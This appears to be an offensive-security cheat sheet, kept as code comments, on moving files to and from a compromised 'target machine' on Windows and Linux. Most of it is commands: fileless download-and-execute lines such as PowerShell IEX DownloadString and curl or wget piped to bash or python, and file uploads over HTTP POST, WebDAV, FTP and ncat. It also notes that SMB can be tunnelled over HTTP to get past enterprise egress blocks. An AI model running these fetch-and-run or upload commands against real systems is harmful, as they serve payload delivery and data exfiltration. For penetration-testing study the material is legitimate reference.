// Transfaring Files
//! Windows (Downloads)
//* Base64
// calculate the hash of a file
// encode the file to base64
// decode the base64 file on the target machine
// then check the hash of the decoded file
//* PowerShell DownloadFile
// (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
//* Fileless Method (Invoke-Expression)
// IEX (New-Object Net.WebClient).DownloadString('<Target File URL>')
//* PowerShell Invoke-WebRequest
// Invoke-WebRequest '<Target File URL>' -OutFile '<Output File Name>'
//! Windows (Uploads)
//* PowerShell Base64 Web Upload
// $b64 = [System.convert]::ToBase64String((Get-Content -Path '<Target File URL>' -Encoding Byte))
// Invoke-WebRequest -Uri <http server> -Method POST -Body $b64
//* SMB Uploads
// since enterprises don't allow the SMB protocol out of their internal network
// we can run smb over http configuring WebDav to run on our machine
// then connect to it
// LIST : dir \\{ip}\DavWWWRoot
// UPLOAD : copy <file> \\{ip}\DavWWWRoot\<file>
//* Ftp Uploads
// (New-Object Net.WebClient).UploadFile('ftp://{ip}/ftp-hosts', '<path to file>')
//! Linux (Downloads)
//* Filless Method
// curl https://<Target File URL><.sh> | bash
// wget -qO- https://<Target File URL><.py> | python3
//* Download with Bash (/dev/tcp)
// exec 3<>/dev/tcp/{ip}/{port}
// echo -e "GET /{file-name} HTTP/1.1\n\n">&3
// cat <&3
//* Using SCP (over SSh)
// scp {user}@{ip}:/path/to/file .
//! Linux (Uploads)
//* SCP Upload
// scp /path/to/scr {user}@{ip}:/path/to/dest
//! Using Code (Downloads)
//* Python
// 2: python2.7 -c 'import urllib;urllib.urlretrieve ("<file-url>", "<file-name>")'
// 3: python3 -c 'import urllib.request;urllib.request.urlretrieve("<file-url>", "<file-name>")'
//* Php
// php -r '$file = file_get_contents("<file-url>"); file_put_contents("<file-name>",$file);'
//* Php filless download
// php -r '$lines = @file("<file-url>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
//* Ruby
// ruby -e 'require "net/http"; File.write("<file-name>", Net::HTTP.get(URI.parse("<file-url>")))'
//* Perl
// perl -e 'use LWP::Simple; getstore("<file-url>", "<file-name>");'
//* Javascript
// 1. save wget.js
// var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
// WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/ false);
// WinHttpReq.Send();
// BinStream = new ActiveXObject("ADODB.Stream");
// BinStream.Type = 1;
// BinStream.Open();
// BinStream.Write(WinHttpReq.ResponseBody);
// BinStream.SaveToFile(WScript.Arguments(1));
// 2. run it
// cscript /nologo wget.js <file-url> <file-name>
//* VBScript
// 1. save wget.vbs
// dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
// dim bStrm: Set bStrm = createobject("Adodb.Stream")
// xHttp.Open "GET", WScript.Arguments.Item(0), False
// xHttp.Send
//
// with bStrm
//     .type = 1
//     .open
//     .write xHttp.responseBody
//     .savetofile WScript.Arguments.Item(1), 2
// end with
// 2. run it
// cscript /nologo wget.vbs <file-url> <file-name>
//! Other Methods
//* Ncat
// download : nc -l -p {port} --recv-only > {file-name}
// upload : ncat --send-only {ip} {port} < {file-name}
